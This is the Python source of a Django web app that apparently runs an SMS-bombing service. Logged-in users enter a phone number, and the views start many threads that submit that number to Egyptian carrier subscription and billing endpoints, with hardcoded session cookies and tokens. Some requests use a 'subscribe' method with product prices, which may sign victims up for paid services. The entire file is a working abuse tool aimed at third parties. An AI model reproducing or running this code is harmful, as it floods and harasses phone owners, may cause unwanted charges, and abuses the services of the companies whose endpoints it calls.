import datetime
import threading
import time
import random
import webbrowser

import requests
from django.contrib.auth import get_user_model
from django.db.models.functions import window
from django.shortcuts import render, redirect
from .forms import sendForm
from .models import Number
from django.contrib.auth.decorators import login_required, permission_required
from django.contrib import messages
from django.conf import settings

User = get_user_model()
lock = threading.Lock()
# make user number massege
# Create your views here.
# number = []

voda = ['vodafone', 'vodafone_2']
num_total_messages_send = 0



def vodafone(number, done_send):
    try:
        url = 'https://px.playmaniax.com/eg2/dwnld052/?'

        cook = requests.get(url).cookies.get_dict()['CC_HOST']
        # print(php)
        data = {
            'flow': 'numberFilled',
            'mno': '60202',
            'msisdn': number,
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip,deflate,br',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Length': '46',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'CC_HOST={cook}',
            'DNT': '1',
            'Host': 'px.playmaniax.com',
            'Origin': 'https',
            'Referer': 'https',
            'sec-ch-ua': '"GoogleChrome";v="93","Not;ABrand";v="99","Chromium";v="93"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0(Linux;Android6.0;Nexus5Build/MRA58N)AppleWebKit/537.36(KHTML,likeGecko)Chrome/93.0.4577.82MobileSafari/537.36', }

        for _ in range(1):
            try:

                requests.post(url, data=data, headers=headers)
                done_send += 1
                print(done_send)
            except:
                pass
    except:
        pass


def vodafone_salah(number, done_send):
    try:
        url = 'https://mohamedsalahvodafone.com/subscription/login'

        data = {
            'phone': number,
            '__RequestVerificationToken': 'CfDJ8LCMiMgcSRRPpJl3ewQh4y0T9Ueb2SVht4YzrG3yE9JhfjmTuIZb7gsjpMuZdyAgDDUJuy5lG23IUa96fqAEKRp3USpgnKYHdYmalsfY_v9vx8AIoXo0daMmHitAV41b39hbij3ISS1j6VBEEzKq9GY',
        }

        head = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-length': '200',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': '__cfduid=d0dea9610de32dfccdac4ca4e76296c081602421000; 3alamSalah.Session=CfDJ8LCMiMgcSRRPpJl3ewQh4y2VlwRyhM4n16bKGu0TvippPqY9QDmf3fUsa%2BBVAkacQ5ms2cNQYFkUfzpMJ%2FkmttWtHQWq7Yc4P8vP0RzF1lNJNv5aMV71cRJleutUe%2FHH89IsEx3dcsdxLlmguC0WhzWTH002ahxF2g8ZrhWSAI%2BP; .AspNetCore.Antiforgery.y8RsE2iwp20=CfDJ8LCMiMgcSRRPpJl3ewQh4y25VEf27n1lLHCqdvewFJDQSzoHI38_ndyCWwz2LCuUysEW2jkAB4nOnt4SrMnyuUziumCW12nNcmdNq8WWx0gfxCEMJxf0-vbGAqTXlJh4f_vPT6OAUbOlZLGcXw8IimY; _ga=GA1.2.1682900928.1602421000; _gid=GA1.2.1278440375.1602421000',
            'dnt': '1',
            'origin': 'https://mohamedsalahvodafone.com',
            'referer': 'https://mohamedsalahvodafone.com/subscription/login',
            'sec-ch-ua': '"Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36'
        }
        for _ in range(1):
            try:

                requests.post(url, data=data, headers=head)
                done_send += 1
                print(done_send)
            except:
                pass
    except:
        pass


def etslat(number, done_send):
    try:
        url = 'https://px.playmaniax.com/eg2/dwnld052/?'

        cook = requests.get(url).cookies.get_dict()['CC_HOST']
        # print(php)
        data = {
            'flow': 'numberFilled',
            'mno': '60203',
            'msisdn': number,
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip,deflate,br',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Length': '46',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'CC_HOST={cook}',
            'DNT': '1',
            'Host': 'px.playmaniax.com',
            'Origin': 'https://px.playmaniax.com/',
            'Referer': 'https://px.playmaniax.com/eg2/dwnld052/',
            'sec-ch-ua': '"Chromium";v="94","GoogleChrome";v="94",";NotABrand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/94.0.4606.61Safari/537.36', }
        for _ in range(1):
            try:

                requests.post(url, data=data, headers=headers)
                done_send += 1
                print(done_send)
            except:
                pass
    except:
        pass


def vodafone_2(number, done_send):
    try:
        url = 'https://login.mondiamediamena.com/billinggw-lcm/billing/submitmsisdn?paysmart'
        session = requests.session()
        good = session.get("https://login.mondiamediamena.com/billinggw-lcm/billing/submitmsisdn?paysmart")
        cook = good.cookies.get_dict()
        token = cook["BIGipServerbilling-gw-lcm.liv.arvm.de_http_pool"]
        data= {
            'merchantId': '35',
            'operatorId': '1',
            'redirect': 'http%3A%2F%2Fgalaxylp.mobi-mind.net%2FHome%2FMondiamediaNotification%3FId%3D842%2CMM%2C20%2C2695%2C412%2C%2C0%2C60202%2C5290%26TrackerID%3D59222268',
            'imgPath': 'http',
            'productCd': 'PLAYMANIAX',
            'subPackage': 'D',
            'prodName': 'Playmaniax',
            'prodPrice': '3.00',
            'currency': 'EGP',
            'method': 'subscribe',
            'txnId': '',
            'ATTEMPT_COUNT': '',
            'numPrefix': '',
            'multiFactor': '0.0',
            'partnerRef': '',
            'reqSource': 'From IP:192.168.192.7, Forwarded from IP:154.238.147.151, UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'freeTrialDays': '0',
            'secureHash': '',
            'checkForVodafoneSpainHeaderEnrichmentParam': 'true',
            'checkSecureHash': 'true',
            'campaignId': '',
            'passCode': token,
            'protectedMediaMode': 'ON_BLOCK_FRAUD',
            'protectedMediaEnvCode': 'L',
            'lcmPageContext': 'https://login.mondiamediamena.com/billinggw-lcm ',
            'wifiMode': 'WiFi',
            'operatorRef': '',
            'opticksClickId': '',
            'langCode': 'ar',
            'appHash': '',
            'cid': '',
            'hybridFlowType2': 'false',
            'msisdn': f'2{number}',}

        
        post = requests.post(url, data=data)
        # print(post.text)
        done_send += 1
        print(done_send)
        print(number)


    except:
        pass


def orange(number, done_send):
    try:
        url = 'https://login.mondiamediamena.com/billinggw-lcm/orange/submitmsisdn?paysmart'
        session = requests.session()
        good = session.get("https://login.mondiamediamena.com/billinggw-lcm/orange/submitmsisdn?paysmart")
        cook = good.cookies.get_dict()
        token = cook["BIGipServerbilling-gw-lcm.liv.arvm.de_http_pool"]

        data = {'merchantId':'35',
            'operatorId':'2',
            'redirect':'http%3A%2F%2Fgalaxylp.mobi-mind.net%2FHome%2FMondiamediaNotification%3FId%3D842%2CMM%2C20%2C2695%2C412%2C%2C0%2C60201%2C5291%26TrackerID%3D58376023',
            'imgPath':'http',
            'productCd':'PLAYMANIAX',
            'subPackage':'D',
            'prodName':'Playmaniax',
            'prodPrice':'3',
            'currency':'EGP',
            'method':'subscribe',
            'txnId':'',
            'ATTEMPT_COUNT':'',
            'numPrefix':'20',
            'multiFactor':'0.0',
            'partnerRef':'',
            'reqSource':'FromIP',
            'freeTrialDays':'0',
            'secureHash':'',
            'checkForVodafoneSpainHeaderEnrichmentParam':'true',
            'checkSecureHash':'true',
            'campaignId':'',
            'passCode':token,
            'protectedMediaMode':'ON_BLOCK_FRAUD',
            'protectedMediaEnvCode':'L',
            'lcmPageContext':'https',
            'wifiMode':'WiFi',
            'operatorRef':'',
            'opticksClickId':'',
            'langCode':'ar',
            'appHash':'',
            'cid':'',
            'hybridFlowType2':'false',
            'msisdn':f'2{number}',
        }


        send = requests.post(url, data=data)
        done_send += 1
        print(done_send)
    except:
        pass


def etslat_2():
    global number, done_send
    try:
        url = 'https://login.mondiamediamena.com/billinggw-lcm/billing/submitmsisdn?paysmart'
        session = requests.session()
        good = session.get("https://login.mondiamediamena.com/billinggw-lcm/billing/submitmsisdn?paysmart")
        cook = good.cookies.get_dict()
        token = cook["BIGipServerbilling-gw-lcm.liv.arvm.de_http_pool"]

        data = {
            'merchantId': '333',
            'operatorId': '4',
            'redirect': 'http%3A%2F%2Fgalaxylp.mobi-mind.net%2FHome%2FMondiamediaNotification%3FId%3D842%2CMM%2C20%2C2695%2C412%2C%2C0%2C60202%2C5290%26TrackerID%3D59222268',
            'imgPath': 'http://galaxylp.mobi-mind.net/CreativeclicksRopeninja/images/service.png',
            'productCd': 'COOLICIOUS',
            'subPackage': 'D',
            'prodName': 'Coolicious',
            'prodPrice': '3.00',
            'currency': 'EGP',
            'method': 'subscribe',
            'txnId': '',
            'ATTEMPT_COUNT': '',
            'numPrefix': '',
            'multiFactor': '0.0',
            'partnerRef': '0b812d5b486b499708e735274091576d',
            'reqSource': 'FromIP',
            'freeTrialDays': '',
            'secureHash': '',
            'checkForVodafoneSpainHeaderEnrichmentParam': 'true',
            'checkSecureHash': 'true',
            'campaignId': '',
            'passCode': token,
            'protectedMediaMode': 'ON_BLOCK_FRAUD',
            'protectedMediaEnvCode': 'L',
            'lcmPageContext': 'https',
            'wifiMode': 'WiFi',
            'operatorRef': '',
            'opticksClickId': '',
            'langCode': 'ar',
            'appHash': '',
            'cid': '',
            'hybridFlowType2': 'false',
            'msisdn': f'2{number[0]}',
        }
        for _ in range(1):

            try:
                requests.post(url, data=data)
                # print(post.text)
                done_send += 1
                print(done_send)

            except:
                continue
    except:
        pass


def home(request):
    return render(request, 'home.html')


def send_message(request):
    global number
    if request.method == "GET":
        try:
            number.clear()
        except:
            pass
        return render(request, 'close.html')


@login_required(login_url="login")
def send_message_voda(request):
    num_masg_send = 0
    done_send = 0
    if request.method == "GET":
        return render(request, 'main/vodafone.html')

    if request.method == "POST":
        # try:
        form = sendForm(request.POST)
        # print(request.user.num_messages)
        user = request.user
        number = request.POST['phone_number']
        # number.append(request.POST['phone_number'])
        user_msg = request.user.num_messages
        total_msg = request.user.total_msg_send
        if form.is_valid():
            topic = form.save(commit=False)
            topic.created_by = user
            topic.messages_send = user_msg

            user = User.objects.get(username=request.user)
            user.total_msg_send = int(user_msg) + int(total_msg)
            user.save()
            topic.total_msgs = int(user_msg) + int(total_msg)

            print(f"total mag send --> ({user.total_msg_send})")

            print(f"messages user in onse ---> ({user_msg})")
            print(f"User--> ({request.user})")
            print(f"Number--> ({number})")
            topic.save()

            def vod():
                vodafone_salah(number, done_send)

            for a in range(int(user_msg)):
                try:
                    threading.Thread(target=vod).start()
                    num_masg_send += 1
                    num_total_messages_send += 1
                except:
                    pass
            time.sleep(20)

            # request.user.num_messages = request.user.num_messages - 5
            # topic.save()
            messages.success(request, f'done send {num_masg_send} messages to {number}')
            messages.success(request, f'total messages send {user.total_msg_send}')
        # except:
        #     messages.success(request, f'done send {num_masg_send} messages to {number}')
        #     messages.success(request, f'total messages send {user.total_msg_send}')
        return redirect('sms_pomper')


@login_required(login_url="login")
def send_message_orange(request):
    num_masg_send = 0
    done_send = 0

    if request.method == "GET":
        return render(request, 'main/orange.html')

    if request.method == "POST":
        form = sendForm(request.POST)
        # print(request.user.num_messages)
        user = request.user
        number = request.POST['phone_number']
        user_msg = request.user.num_messages
        total_msg = request.user.total_msg_send
        if form.is_valid():
            topic = form.save(commit=False)
            topic.created_by = user
            topic.messages_send = user_msg

            user = User.objects.get(username=request.user)
            user.total_msg_send = int(user_msg) + int(total_msg)
            user.save()
            topic.total_msgs = int(user_msg) + int(total_msg)

            print(f"total mag send --> ({user.total_msg_send})")

            print(f"messages user in onse ---> ({user_msg})")
            print(f"User--> ({request.user})")
            print(f"Number--> ({number})")
            topic.save()

            def orang():
                orange(number, done_send)

            for a in range(int(user_msg)):
                try:
                    threading.Thread(target=orang).start()
                    num_masg_send += 1
                    num_total_messages_send += 1
                    done_send += 1
                except:
                    pass
            time.sleep(20)

            # request.user.num_messages = request.user.num_messages - 5
            # topic.save()
            messages.success(request, f'done send {num_masg_send} messages to {number}')
            messages.success(request, f'total messages send {user.total_msg_send}')

            return redirect('sms_pomper')


@login_required(login_url="login")
def send_message_etis(request):
    num_masg_send = 0
    done_send = 0

    global num_total_messages_send, number
    if request.method == "GET":
        return render(request, 'main/etisalat.html')

    if request.method == "POST":

        form = sendForm(request.POST)
        # username = request.POST['phone_number']
        # print(username)
        # print(request.POST['phone_number'])
        number = request.POST['phone_number']
        user = request.user
        user_msg = request.user.num_messages
        total_msg = request.user.total_msg_send
        if form.is_valid():
            topic = form.save(commit=False)
            topic.created_by = user
            topic.messages_send = user_msg

            user = User.objects.get(username=request.user)
            user.total_msg_send = int(user_msg) + int(total_msg)
            user.save()
            topic.total_msgs = int(user_msg) + int(total_msg)

            print(f"total mag send --> ({user.total_msg_send})")

            print(f"messages user in onse ---> ({user_msg})")
            print(f"User--> ({request.user})")
            print(f"Number--> ({number})")
            topic.save()

            def ets():
                etslat(number, done_send)

            for a in range(int(user_msg)):
                try:
                    threading.Thread(target=ets).start()
                    num_masg_send += 1
                    num_total_messages_send += 1
                except:
                    pass
            time.sleep(20)
            # request.user.num_messages = request.user.num_messages - 5
            # topic.save()
            messages.success(request, f'done send {num_masg_send} messages to {number}')
            messages.success(request, f'total messages send {user.total_msg_send}')

            return redirect('sms_pomper')
